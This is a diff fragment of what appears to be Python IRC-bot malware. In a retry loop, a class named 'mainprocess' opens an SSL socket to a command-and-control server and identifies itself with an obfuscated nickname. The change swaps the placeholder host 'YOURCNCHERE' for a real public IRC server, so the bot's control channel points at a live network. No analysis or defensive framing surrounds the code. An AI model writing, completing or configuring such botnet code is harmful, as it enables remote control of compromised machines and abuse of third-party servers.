@@ -2428,7 +2428,7 @@ class mainprocess:
         while 1:
             try:
                 self.commSock = socket.socket()
-                self.commSock.connect(("YOURCNCHERE", 6697))
+                self.commSock.connect(("irc.dal.net", 6697))
                 self.commSock = ssl.wrap_socket(self.commSock)
                 self.commSock.send("NICK %s\n" % self.hLqhZnCt)
                 self.commSock.send(
